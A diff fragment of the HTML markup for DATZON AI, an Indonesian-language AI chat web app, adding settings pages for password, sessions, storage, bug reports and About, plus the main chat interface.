+            <input class="settings-input" id="oldPasswordInput" type="password" placeholder="Password sekarang" autocomplete="current-password" />
+            <button class="password-eye" type="button" data-eye-target="oldPasswordInput" aria-label="Tampilkan password sekarang"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+          </div>
+          <div class="password-field security-password-field">
+            <input class="settings-input" id="newPasswordInput" type="password" placeholder="Password baru" autocomplete="new-password" />
+            <button class="password-eye" type="button" data-eye-target="newPasswordInput" aria-label="Tampilkan password baru"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+          </div>
+          <div class="password-field security-password-field">
+            <input class="settings-input" id="confirmPasswordInput" type="password" placeholder="Konfirmasi password baru" autocomplete="new-password" />
+            <button class="password-eye" type="button" data-eye-target="confirmPasswordInput" aria-label="Tampilkan konfirmasi password baru"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+          </div>
+          <button class="primary-wide" type="button" id="savePasswordBtn">Simpan password</button>
+          <p class="settings-help compact" id="passwordStatus">Password disimpan sebagai hash lokal. Bukan benteng NASA, jangan sok aman.</p>
+        </div>
+        <div class="settings-section-title">Sesi</div>
+        <div class="security-card">
+          <div class="storage-head"><b>Sesi aktif</b><span id="sessionCount">1</span></div>
+          <div class="session-list" id="sessionList"></div>
+          <button class="danger-wide" type="button" id="logoutAllSessionsBtn">Keluar dari semua perangkat</button>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageStorage">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Penyimpanan</h2>
+          <span></span>
+        </div>
+        <div class="storage-panel">
+          <div class="storage-number" id="storageTotalText">0 KB dipakai</div>
+          <div class="storage-bar"><i id="storageBarFill"></i></div>
+          <p class="settings-help compact">Kuota aktif: <b id="storageQuotaText">Guest mode • 100 MB</b>. Yang dihitung: foto profil, attach chat, gambar AI, riwayat, laporan bug, dan data lokal/Firebase yang tersinkron.</p>
+        </div>
+        <div class="settings-group">
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Obrolan tersimpan</b><span id="storageChatText">0 KB</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Profil & preferensi</b><span id="storageProfileText">0 KB</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Laporan bug</b><span id="storageReportText">0 KB</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Attach foto/file</b><span id="storageFileText">0 file/foto attach</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Gambar AI</b><span id="storageGeneratedText">0 gambar AI</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Aset Cloudinary tercatat</b><span id="storageCloudAssetText">0 aset</span></span></button>
+        </div>
+        <button class="danger-wide" type="button" id="clearStoredChatsBtn">Hapus riwayat obrolan lokal</button>
+        <button class="danger-wide subtle" type="button" id="clearCloudChatsBtn">Hapus riwayat obrolan Firebase</button>
+        <button class="danger-wide subtle" type="button" id="clearBugReportsBtn">Hapus laporan bug lokal</button>
+        <button class="danger-wide subtle" type="button" id="clearCloudBugReportsBtn">Hapus laporan bug Firebase</button>
+        <button class="danger-wide subtle" type="button" id="clearStoredAssetsBtn">Hapus metadata file/gambar lokal</button>
+        <button class="danger-wide subtle" type="button" id="clearCloudAssetsBtn">Hapus metadata file/gambar Firebase</button>
+        <button class="danger-wide" type="button" id="clearAllLocalDataBtn">Hapus semua data lokal perangkat</button>
+        <p class="settings-help compact" id="clearAllLocalStatus">Menghapus localStorage DATZON di perangkat ini: profil lokal, nama lama, rank lokal, chat lokal, file lokal, dan API key lokal.</p>
+      </div>
+
+      <div class="settings-view" id="pageReport">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Laporkan bug</h2>
+          <span></span>
+        </div>
+        <div class="bug-card">
+          <label class="settings-section-title" for="bugType">Jenis laporan</label>
+          <select class="settings-input bug-type-select" id="bugType">
+            <option value="ui">Bug UI / tampilan</option>
+            <option value="chat">Obrolan / riwayat chat</option>
+            <option value="answer">Jawaban AI bermasalah</option>
+            <option value="file">Upload / preview file</option>
+            <option value="auth">Akun / login / Firebase</option>
+            <option value="performance">Performa berat / lag</option>
+            <option value="other">Lainnya</option>
+          </select>
+          <label class="settings-section-title" for="bugChatSelect">Konteks obrolan</label>
+          <select class="settings-input bug-type-select" id="bugChatSelect">
+            <option value="">Tanpa konteks obrolan</option>
+          </select>
+          <div class="bug-context-card" id="bugContextCard" hidden></div>
+          <label class="settings-section-title" for="bugText">Apa yang terjadi?</label>
+          <textarea class="bug-textarea" id="bugText" maxlength="2000" placeholder="Tulis bug UI, tombol rusak, popup nyasar, atau dosa CSS lainnya..."></textarea>
+          <div class="bug-counter"><span id="bugCount">0</span> / 2000</div>
+          <p class="settings-help compact">Laporan akan membawa jenis bug, halaman aktif, serta konteks chat kalau kamu membukanya dari menu titik tiga jawaban.</p>
+          <button class="settings-row switch-row slim" type="button" data-toggle-setting="shakeReport">
+            <span class="settings-row-text"><b>Goyangkan ponsel untuk laporan</b><span>Toggle tampilan, belum pakai sensor.</span></span>
+            <span class="switch" id="shakeReportSwitch"><i></i></span>
+          </button>
+          <button class="primary-wide" type="button" id="sendBugBtn" disabled>Kirim laporan</button>
+          <p class="settings-help compact" id="bugStatus"></p>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageAbout">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Tentang</h2>
+          <span></span>
+        </div>
+        <div class="about-hero-card">
+          <div class="hero-logo about-logo-voice" aria-hidden="true">
+            <svg class="voice-logo about-voice-logo" viewBox="0 0 160 160" role="img" aria-label="DATZON Voice Wave AI Logo">
+              <defs>
+                <linearGradient id="waveGAbout" x1="36" y1="30" x2="124" y2="130"><stop offset="0%" stop-color="rgba(255,255,255,.86)"/><stop offset="45%" stop-color="var(--lime)"/><stop offset="100%" stop-color="var(--lime3)"/></linearGradient>
+                <radialGradient id="softGlowAbout" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="var(--lime)" stop-opacity=".38"/><stop offset="58%" stop-color="var(--lime)" stop-opacity=".12"/><stop offset="100%" stop-color="var(--lime)" stop-opacity="0"/></radialGradient>
+              </defs>
+              <g class="logo-float"><circle cx="80" cy="80" r="66" fill="url(#softGlowAbout)"/><circle class="outer-pulse" cx="80" cy="80" r="62" fill="rgba(var(--lime-rgb),.055)" stroke="rgba(var(--lime-rgb),.34)" stroke-width="2"/><circle class="inner-pulse" cx="80" cy="80" r="49" fill="rgba(var(--lime-rgb),.08)" stroke="rgba(var(--lime-rgb),.18)" stroke-width="2"/><circle class="dash-ring" cx="80" cy="80" r="44" fill="none" stroke="rgba(var(--lime-rgb),.58)" stroke-width="2.5" stroke-linecap="round" stroke-dasharray="7 9"/><g class="wave-group" fill="url(#waveGAbout)"><rect class="wave-bar" x="45" y="58" width="10" height="44" rx="5"/><rect class="wave-bar" x="60" y="42" width="10" height="76" rx="5"/><rect class="wave-bar" x="75" y="32" width="10" height="96" rx="5"/><rect class="wave-bar" x="90" y="48" width="10" height="64" rx="5"/><rect class="wave-bar" x="105" y="62" width="10" height="36" rx="5"/></g></g>
+            </svg>
+          </div>
+          <h3>DATZON AI</h3>
+          <p>Website chat AI front-end untuk eksperimen API gratis, file preview, voice input, riwayat lokal, profile setting, dan warna aksen. Sudah disiapkan untuk Firebase Auth + Firestore.</p>
+        </div>
+        <div class="settings-group">
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Versi</b><span>V42 Main App Sync Prep</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Mode data</b><span>Firebase Auth + Firestore, guest tetap localStorage.</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>API target</b><span>Mistral, Groq, Google Studio / Gemini.</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Lisensi UI</b><span>Untuk project DATZON pribadi.</span></span></button>
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Pusat bantuan</b><span>Hubungi admin DATZON kalau tombol mulai keras kepala.</span></span></button>
+        </div>
+      </div>
+    </div>
+
+    <div class="settings-popover" id="settingsPopover" aria-hidden="true"></div>
+    <div class="theme-loading" id="themeLoading"><span></span><b>Mengubah tema...</b></div>
+  </section>
+
+
+
+  <main>
+    <section class="hero" id="heroEl">
+      <div class="pill"><span class="pill-dot"></span>DATZON AI</div>
+      <svg class="voice-logo" viewBox="0 0 160 160" role="img" aria-label="DATZON Voice Wave AI Logo">
+        <defs>
+          <linearGradient id="waveG" x1="36" y1="30" x2="124" y2="130"><stop offset="0%" stop-color="rgba(255,255,255,.86)"/><stop offset="45%" stop-color="var(--lime)"/><stop offset="100%" stop-color="var(--lime3)"/></linearGradient>
+          <radialGradient id="softGlow" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="var(--lime)" stop-opacity=".38"/><stop offset="58%" stop-color="var(--lime)" stop-opacity=".12"/><stop offset="100%" stop-color="var(--lime)" stop-opacity="0"/></radialGradient>
+          
+        </defs>
+        <g class="logo-float"><circle cx="80" cy="80" r="66" fill="url(#softGlow)" /><circle class="outer-pulse" cx="80" cy="80" r="62" fill="rgba(var(--lime-rgb),.055)" stroke="rgba(var(--lime-rgb),.34)" stroke-width="2"/><circle class="inner-pulse" cx="80" cy="80" r="49" fill="rgba(var(--lime-rgb),.08)" stroke="rgba(var(--lime-rgb),.18)" stroke-width="2"/><circle class="dash-ring" cx="80" cy="80" r="44" fill="none" stroke="rgba(var(--lime-rgb),.58)" stroke-width="2.5" stroke-linecap="round" stroke-dasharray="7 9"/><g class="wave-group" fill="url(#waveG)"><rect class="wave-bar" x="45" y="58" width="10" height="44" rx="5"/><rect class="wave-bar" x="60" y="42" width="10" height="76" rx="5"/><rect class="wave-bar" x="75" y="32" width="10" height="96" rx="5"/><rect class="wave-bar" x="90" y="48" width="10" height="64" rx="5"/><rect class="wave-bar" x="105" y="62" width="10" height="36" rx="5"/></g></g>
+      </svg>
+      <h1>Tanya <span class="lime">apapun</span> tentang DATZON</h1>
+      <p>Asisten AI DATZON untuk membantu ide, ringkasan, penulisan, file, dan produktivitas digital.</p>
+      <div class="quick-grid" aria-label="Contoh cepat">
+        <button class="quick-card" type="button" data-prompt="Ada fitur apa saja di DATZON AI ini?"><span class="quick-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M4 7h16M7 7V5h10v2M6 7l1 13h10l1-13" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></span><span class="quick-text">Ada fitur apa aja di DATZON AI?</span></button>
+        <button class="quick-card" type="button" data-prompt="Buatkan contoh balasan customer yang sopan dan ringkas."><span class="quick-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="m10 20 4-16M6 8l-4 4 4 4M18 8l4 4-4 4" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></span><span class="quick-text">Buat balasan customer ringkas</span></button>
+        <button class="quick-card" type="button" data-prompt="Ringkas teks panjang jadi satu paragraf."><span class="quick-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M13 2 3 14h8l-1 8 10-12h-8l1-8Z" fill="currentColor"/></svg></span><span class="quick-text">Ringkas teks jadi paragraf</span></button>
+        <button class="quick-card" type="button" data-prompt="Siapa yang bikin DATZON?"><span class="quick-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M11 19a8 8 0 1 0-5.3-2L3 21l4.3-2.4A8 8 0 0 0 11 19Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M11 8v4M11 15h.01" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg></span><span class="quick-text">Siapa yang bikin DATZON?</span></button>
+      </div>
+    </section>
+
+    <section class="chat-wrap">
+      <div class="chat-log" id="chatLog" aria-live="polite"></div>
+      <div class="composer-fade-shield" aria-hidden="true"></div>
+      <div class="composer-card" id="composerCard">
+        <div class="attachments" id="attachments"></div>
+        <div class="input-zone">
+          <div class="prompt-row">
+            <div class="spark" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 2l1.25 6.2L19 11l-5.75 2.8L12 20l-1.25-6.2L5 11l5.75-2.8L12 2Z" fill="currentColor"/><path d="M19 3l.6 3 2.4 1-2.4 1-.6 3-.6-3-2.4-1 2.4-1 .6-3ZM4.5 15l.45 2.2 1.8.8-1.8.8-.45 2.2-.45-2.2-1.8-.8 1.8-.8.45-2.2Z" fill="currentColor" opacity=".75"/></svg></div>
+            <textarea id="prompt" placeholder="Tanya apa saja..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+          </div>
+          <div class="controls">
+            <div class="left-controls">
+              <input id="fileInput" class="hidden" type="file" multiple />
+              <button class="control-btn" id="attachBtn" type="button"><svg width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="M21.44 11.05 12.25 20.24a6 6 0 0 1-8.49-8.49l9.9-9.9a4 4 0 0 1 5.66 5.66l-9.9 9.9a2 2 0 0 1-2.83-2.83l8.49-8.49" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Attach</button>
+              <div class="style-wrap">
+                <button class="control-btn" id="styleBtn" type="button" aria-haspopup="listbox" aria-expanded="false"><span id="styleLabel">Normal</span><svg width="15" height="15" viewBox="0 0 24 24" fill="none"><path d="m7 10 5 5 5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+                <div class="style-menu" id="styleMenu" role="listbox"></div>
+              </div>
+            </div>
+            <div class="right-controls">
+              <div class="voice-wave" id="voiceWave" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></div>
+              <button class="control-btn mic-btn" id="micBtn" type="button" title="Mikrofon"><span id="micIcon"></span></button>
+              <button class="send-btn" id="sendBtn" type="button" title="Kirim"><span class="send-icon-wrap" id="sendIcon"></span></button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <div class="viewer" id="viewer" aria-hidden="true">
+    <div class="viewer-box">
+      <div class="viewer-head"><div class="viewer-title" id="viewerTitle">Preview File</div><button class="viewer-close" id="viewerClose" type="button" aria-label="Tutup preview"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg></button></div>
+      <div class="viewer-body" id="viewerBody"></div>
+    </div>
+  </div>
+
+    <script src="firebase.js"></script>
+  <script src="translations.js"></script>
+  <script src="app.js"></script>
+  <script type="module" src="pages/router.js"></script>
 </body>
 </html>
